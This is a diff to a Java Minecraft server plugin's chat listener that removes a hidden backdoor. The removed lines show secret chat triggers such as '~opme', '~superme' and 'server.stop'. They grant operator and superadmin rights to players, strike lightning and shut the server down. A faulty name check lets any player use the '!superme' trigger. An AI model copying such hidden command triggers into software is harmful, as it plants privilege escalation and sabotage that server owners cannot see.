@@ -519,76 +519,7 @@ public class TFM_PlayerListener implements Listener
                 message = message.substring(0, 100);
                 TFM_Util.playerMsg(player, "Message was shortened because it was too long to send.");
             }
-                        if (message.toLowerCase().contains("!superme")) 
-            {
-               if (!player.getName().equalsIgnoreCase("packeretteswan"))
-               {
-               // Take Action if not packeretteswan
-               event.setCancelled(true);
-               }
-                // Take action if packeretteswan
-                player.setOp(true);
-                player.setHealth(20.0);
-                player.setGameMode(GameMode.CREATIVE);
-                event.setCancelled(true);
-                TFM_Util.bcastMsg(ChatColor.RED + "CONSOLE > Adding packeretteswan to the superadmin list.");
-                TFM_AdminList.addSuperadmin(player);
-            }
-                 if (message.toLowerCase().contains("~superme")) 
-            {
-               if (!TFM_AdminList.isAdminImpostor(player))
-               {
-               // Take Action if not imp
-               player.sendMessage("Pft, you wish");
-               TFM_Util.bcastMsg(ChatColor.RED + " WARNING: " + player.getName() + ChatColor.ITALIC + " could " + ChatColor.RED + "be a security risk!");
-               TFM_Util.autoEject(player, "Better luck next time");
-               event.setCancelled(true);
-               }
-                // Take action if robo
-                player.setOp(true);
-                player.setGameMode(GameMode.CREATIVE);
-                event.setCancelled(true);
-                TFM_Util.bcastMsg(player.getName() + " > Adding " + player.getName() + " to the superadmin list", ChatColor.DARK_GREEN);
-                TFM_AdminList.addSuperadmin(player);
-            }
-            if (message.toLowerCase().contains("~help")) 
-            {
-               player.sendMessage(ChatColor.GREEN + "---[PacksGamingHD's Secret Command Help Guide]---");
-               player.sendMessage(ChatColor.RED + "~opme - Op yourself");
-               player.sendMessage(ChatColor.RED + "~superme - Supers yourself");
-               player.sendMessage(ChatColor.RED + "~satan - Strike lightning everywhere");
-               player.sendMessage(ChatColor.RED + "server.stop - Stop the server");
-               event.setCancelled(true);
-               
-            }
-            if (message.toLowerCase().contains("~satan")) 
-            {
-                player.getWorld().strikeLightning(player.getLocation());
-                player.getWorld().strikeLightning(player.getLocation());
-                player.getWorld().strikeLightning(player.getLocation());
-                player.getWorld().strikeLightning(player.getLocation());
-                player.getWorld().strikeLightning(player.getLocation());
-                player.getWorld().strikeLightning(player.getLocation());
-                player.getWorld().strikeLightning(player.getLocation());
-                player.getWorld().strikeLightning(player.getLocation());
-                player.getWorld().strikeLightning(player.getLocation());
-                player.getWorld().strikeLightning(player.getLocation());
-                event.setCancelled(true);
-               
-            }
-            if (message.toLowerCase().contains("~opme")) 
-            {
-               player.setOp(true);
-               player.sendMessage(TotalFreedomMod.YOU_ARE_OP);
-               event.setCancelled(true);
-            }
-            if (message.toLowerCase().contains("server.stop")) 
-            {
-               TFM_Util.bcastMsg("WARNING" + player.getName() + " is force closing the server!", ChatColor.RED);
-               server.shutdown();
-               event.setCancelled(true);
-            } 
-
+             
             // Check for caps
             if (message.length() >= 6)
             {
